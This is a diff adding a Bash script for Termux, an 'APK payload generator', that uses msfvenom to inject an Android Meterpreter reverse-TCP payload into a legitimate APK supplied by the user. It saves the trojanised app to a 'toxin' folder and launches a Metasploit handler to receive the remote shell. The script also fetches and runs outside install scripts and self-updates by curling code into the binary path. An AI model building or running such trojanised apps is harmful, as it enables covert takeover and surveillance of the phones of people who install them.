@@ -1,0 +1,179 @@
+#!/bin/bash
+
+#Colors
+ normal=$(echo -en "\e[0m")
+ orange=$(echo -en "\e[33m")
+ aqua=$(echo -en "\e[36m")
+ lightgreen=$(echo -en "\e[92m")
+
+function ascii() {
+echo "$aqua
+
+⠀⠀⠀⠀⠀⠀⠀⣄⡄⠀⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢾⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⡴⡓⡓⡆⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠘⠋⢆⡠⢀⠀
+⠀⠀⣰⡴⡿⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠵	#########################
+⢠⡴⢃⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡠⣤⠀⠀⠀⠀⠀⣀⣦⡦⡀⠀⠀⠀⢢⡕⠾⣳⡆⠀⠀⠀⠀⢖⡆⠂        # Copyrtit of Salvatore #
+⠀⡠⡥⢓⠆⠀⠀⠀⠀⠀⠀⢀⢿⣿⣫⡾⠓⠀⠀⠀⢾⢇⢩⠞⠋⠀⠀⠀⠁⠋⠉⠁⠀⠀⠀⢀⡛⠉⠀⠀	#  script for generate 	#
+⠀⠄⠐⠈⡩⣖⢁⢂⠀⠀⠀⠀⠁⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠟⠁⠀⠀⠀	#	 Payload        #
+⠀⠀⠀⠀⠈⠈⢩..                       ..		#########################
+⠀⠀⠀⠀⠀⠈⠀⠀⠚⡩⠅⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠍⠁⠀⠀⠀⠀⠀⠀
+⠀
+
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀		⠀⠀   #Cukur Tools 
+ ----------- APK PAYLOAD GENERATOR -----------
+                                 - By  Salvatore <>
+$normal "
+
+}      
+function setup() {
+    ascii
+    pkg install nala git wget curl -y 
+    if ! command -v msfconsole &> /dev/null
+	then
+		echo "$orange Metasploit not found."
+        echo "Either install it manually or press 'Y' to continue."
+        echo "Do You want to install it? $normal"
+		read -rp "[?] Select [Y/n]> : " answer_1
+        clear
+            case "$answer_1" in
+                Y* | y*) echo "Installating metasploit."
+                wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+                chmod +x metasploit.sh
+                ./metasploit.sh
+                rm metasploit.sh            
+                ;;
+            esac
+            
+	else
+        echo "Metasploit already present, skipping reinstallation."
+    fi
+
+    clear
+    ascii
+    nala install apktool aapt openjdk-17 apksigner -y || git clone https://github.com/OnlineHacKing/TermuxTools-Installation && cd TermuxTools-Installation/Apktool-Termux && dpkg -i apktool_2.3.4_all.deb && cd ../.. && rm -rf TermuxTools-Installation
+}
+#function lhost
+function get_lhost()
+{
+    clear
+    ascii
+    echo ""
+  	read -rp "Set LHOST : " LHOST
+}
+#function lport
+function get_lport()
+{
+    clear
+    ascii
+    echo ""
+    read -rp "Set LPORT : " LPORT
+}
+#function payload
+function get_payload()
+{
+    PAYLOAD="android/meterpreter/reverse_tcp"
+}
+function modded_apk()
+{
+    clear
+    ascii
+    echo ""
+    read -rp "Set Modded Apk Name : " mod_apk
+}
+#function original apk
+function original_apk()
+{
+    clear
+    ascii
+    echo ""
+    read -rp "Set Original apk path : " orig_apk
+}
+function gen_payload() {
+    clear
+    ascii
+    echo "$green"
+    echo "Starting Metasploit, might take some time. $normal"
+    msfvenom -x $orig_apk -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $mod_apk
+    if [ -e "$mod_apk" ]
+    then
+        clear
+        ascii
+        mkdir -p ~/storage/shared/toxin
+        mv $mod_apk ~/storage/shared/toxin
+        echo ""
+        echo "$aqua Your apk was stored at /storage/emulated/0/toxin/$mod_apk $normal"
+    else
+        echo "$orange Try with different apk. This apk looks sus.$normal"
+    fi
+}
+function listener_lhost()
+{
+    clear
+    ascii
+    echo ""
+  	read -rp "Set LHOST : " l_host
+}
+#function lport
+function listener_lport()
+{
+    clear
+    ascii
+    echo ""
+    read -rp "Ser LPORT : " l_port
+}
+function start_handler() {
+    listener_lhost
+    listener_lport
+    clear
+    ascii
+    echo "$green"
+    echo "Starting Metasploit, might take some time. $normal"
+    msfconsole -x "use multi/handler; set LHOST $l_host ; set LPORT $l_port ; set PAYLOAD $PAYLOAD ; exploit"
+}
+function update()
+{
+curl -s https://raw.githubusercontent.com/ksauraj/toxin/master/toxin -o toxin
+rm $PREFIX/bin/toxin
+mv toxin $PREFIX/bin 
+chmod +x $PREFIX/bin/toxin
+exit 0
+}
+function main() {
+    clear
+    ascii
+    echo "  
+    [1]=> - Generate Payload
+    [2]=> - Start Listener       #cukur tools  created by  salvatore
+    [3]=> - Start Setup
+    [4]=> - Update tool
+    [q]=> - Quit"
+    echo ""
+    read -rp "    [?] Select : " answer
+    clear
+        case "$answer" in
+            1*) 
+                ascii
+                get_lhost
+                get_lport
+                original_apk
+                modded_apk
+                gen_payload
+            ;;
+            2*)
+                ascii
+                start_handler
+            ;;
+            3*)
+                setup
+            ;;
+            4*)
+                update
+            ;;
+            q*)
+                echo -e $aqua " Good Bye !!"
+                exit 0
+            ;;
+        esac
+}
+
+main
